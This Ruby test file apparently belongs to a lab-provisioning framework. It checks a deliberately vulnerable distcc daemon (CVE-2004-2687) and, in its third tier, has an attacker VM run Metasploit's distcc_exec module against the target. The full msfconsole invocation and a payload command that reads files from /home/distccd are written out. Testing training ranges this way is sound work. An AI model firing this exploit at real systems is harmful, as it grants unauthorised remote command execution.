require_relative '../../../../../lib/post_provision_test'

# Post-provision test for the DistCC Daemon Command Execution vulnerability
# (CVE-2004-2687, exploit/unix/misc/distcc_exec).
#
# Tiers:
#   1  distccd is installed on the target.
#   2  the distcc daemon is listening (port 3632).
#   3  a real exploit from the attacker VM achieves remote command execution.
#
# Tier 3 (Phase 1C) is the first exploit test driven from a second VM: it runs
# Metasploit's distcc_exec module on the "attacker" system (a Kali/MSF box) in
# the same project, against this target's IP, and proves RCE by having the
# payload drop a sentinel file that we then confirm on the target over its own
# guest agent. If there is no attacker system (e.g. a single-VM module run) the
# tier-3 checks SKIP, so the module test still works on its own.
class DistCCExecTest < PostProvisionTest
  ATTACKER = 'attacker'.freeze
  MSF_MODULE = 'exploit/unix/misc/distcc_exec'.freeze

  def initialize
    self.module_name = 'distcc_exec'
    self.module_path = get_module_path(__FILE__)
    super
    self.port = 3632
  end

  def test_module
    super

    # Tier 1 — installed on the target.
    test_command_succeeds('distccd installed', 'command -v distccd', tier: 1)

    # Tier 2 — daemon listening on the target.
    test_service_up(tier: 2)

    # Tier 3 — exploit from the attacker VM.
    test_exploit_from_attacker
  end

  private

  def test_exploit_from_attacker
    name = 'distcc exploit (msf from attacker)'

    unless proxmox?
      skip_check(name, 'Exploit test only runs on the Proxmox pipeline', tier: 3)
      return
    end
    unless system_present?(ATTACKER)
      skip_check(name, "No '#{ATTACKER}' system in this project; tier-3 exploit skipped", tier: 3)
      return
    end

    target_ip = system_ip          # this (target) system's IP, via its guest agent
    attacker_ip = other_system_ip(ATTACKER)
    if target_ip.nil? || attacker_ip.nil?
      skip_check(name, "Could not resolve target (#{target_ip.inspect}) or attacker (#{attacker_ip.inspect}) IP", tier: 3)
      return
    end

    nonce = "#{Time.now.to_i}_#{rand(100000)}"
    sentinel = "/tmp/distcc_pwned_#{nonce}"

    # One-shot msfconsole run on the attacker. We use the no-session command
    # payload cmd/unix/generic: distcc_exec runs our CMD on the target via the
    # compiler trick, so there is no reverse/bind shell to race — the proof is
    # the sentinel file the command leaves on the target, which we then confirm
    # over the target's own guest agent. The command also records id/hostname
    # and the leaked flag into the sentinel as evidence.
    #
    # HOME must be exported: the guest agent runs commands with no HOME, and
    # msfconsole's rb-readline aborts on startup without it.
    payload_cmd = "id > #{sentinel}; uname -n >> #{sentinel}; " \
                  "cat /home/distccd/* >> #{sentinel} 2>/dev/null; chmod 644 #{sentinel}"
    msf = <<~MSF.gsub("\n", ' ')
      export HOME=/root TERM=dumb;
      msfconsole -q -x "
      use #{MSF_MODULE};
      set RHOSTS #{target_ip};
      set RPORT #{self.port};
      set PAYLOAD cmd/unix/generic;
      set CMD '#{payload_cmd}';
      run;
      sleep 8;
      exit -y
      "
    MSF

    result = run_on_system(ATTACKER, msf, timeout: 600)
    msf_out = "#{result[:stdout]}\n#{result[:stderr]}"
    add_evidence('msf_output', "echo #{Shellwords.escape(msf_out[-4000..-1] || msf_out)}")

    # Proof of RCE: the sentinel the exploit's command left on the target.
    sentinel_read = run_vagrant_ssh("cat #{sentinel} 2>/dev/null", timeout: 30)
    sentinel_body = sentinel_read[:stdout].to_s
    add_evidence('sentinel_on_target', "echo #{Shellwords.escape(sentinel_body)}") unless sentinel_body.empty?

    if sentinel_body =~ /uid=\d+/
      pass_check(name,
                 "RCE confirmed: #{MSF_MODULE} from #{ATTACKER} (#{attacker_ip}) ran a command on the target (#{target_ip}); sentinel #{sentinel} contains #{sentinel_body[/uid=\S+/]}.",
                 tier: 3)
    else
      fail_check(name,
                 "Exploit did not confirm RCE: sentinel #{sentinel} absent or empty on the target. See msf_output evidence.",
                 tier: 3)
    end
  end
end

DistCCExecTest.new.run
